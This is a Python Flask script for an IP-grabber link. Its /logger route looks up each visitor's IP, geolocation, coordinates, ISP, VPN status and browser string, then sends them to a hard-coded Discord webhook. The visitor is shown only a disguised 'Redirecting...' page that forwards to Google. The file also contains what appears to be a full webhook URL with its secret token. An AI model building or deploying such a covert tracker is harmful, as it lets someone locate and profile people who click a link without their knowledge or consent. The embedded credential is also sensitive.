            from flask import Flask, request, Response, redirect, render_template_string
import requests
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURATION ---
# REGENERATE YOUR DISCORD WEBHOOK – the old one is public.
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"

# Ignore your own IP (for testing)
IGNORE_IPS = ["127.0.0.1", "YOUR_PUBLIC_IP"]

# --- Helpers ---
def get_client_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    return forwarded.split(',')[0].strip() if forwarded else request.remote_addr

def is_ignored(ip):
    return ip in IGNORE_IPS

def get_ip_info(ip):
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if resp.status_code == 200 and 'error' not in resp.json():
            d = resp.json()
            return {'country': d.get('country_name'), 'region': d.get('region'), 'city': d.get('city'),
                    'lat': d.get('latitude'), 'lon': d.get('longitude'), 'isp': d.get('org'),
                    'proxy': d.get('proxy') or d.get('vpn') or False, 'timezone': d.get('timezone')}
    except: pass
    # fallback
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,proxy,timezone', timeout=5)
        if resp.status_code == 200 and resp.json().get('status') == 'success':
            d = resp.json()
            return {'country': d.get('country'), 'region': d.get('regionName'), 'city': d.get('city'),
                    'lat': d.get('lat'), 'lon': d.get('lon'), 'isp': d.get('isp'),
                    'proxy': d.get('proxy') or False, 'timezone': d.get('timezone')}
    except: pass
    return None

def send_to_discord(title, fields, color=0x00ff00):
    embed = {"title": title, "color": color, "fields": fields, "timestamp": datetime.utcnow().isoformat()}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except: pass

# --- Routes ---
@app.route('/')
def home():
    return redirect('/logger')

@app.route('/logger')
def logger():
    ip = get_client_ip()
    if not is_ignored(ip):
        ip_info = get_ip_info(ip)
        vpn = "🔴 ON (VPN/Proxy)" if ip_info and ip_info.get('proxy') else "🟢 OFF"
        loc = f"{ip_info.get('city','N/A')}, {ip_info.get('region','N/A')}, {ip_info.get('country','N/A')}" if ip_info else "N/A"
        coords = f"{ip_info.get('lat','N/A')}, {ip_info.get('lon','N/A')}" if ip_info else "N/A"
        isp = ip_info.get('isp', 'N/A') if ip_info else "N/A"
        ua = request.headers.get('User-Agent', 'Unknown')
        fields = [
            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ VPN", "value": vpn, "inline": True},
            {"name": "📍 Location", "value": loc, "inline": False},
            {"name": "🗺️ Coords", "value": f"`{coords}`", "inline": True},
            {"name": "📡 ISP", "value": isp, "inline": True},
            {"name": "💻 Device", "value": ua[:80] + ("..." if len(ua)>80 else ""), "inline": False},
        ]
        send_to_discord("🎯 VISITOR LOGGED", fields, color=0x00ff00)
    # Display a quick "Redirecting..." page that auto-redirects to Google after 2 seconds
    html = """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><meta http-equiv="refresh" content="2;url=https://www.google.com"></head>
    <body style="background:#0a0a14;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;">
        <div style="text-align:center;">
            <h2>⏳ Redirecting...</h2>
            <p style="color:#888;">You will be redirected shortly.</p>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

# --- Local test ---
if __name__ == '__main__':
    app.run(debug=True)
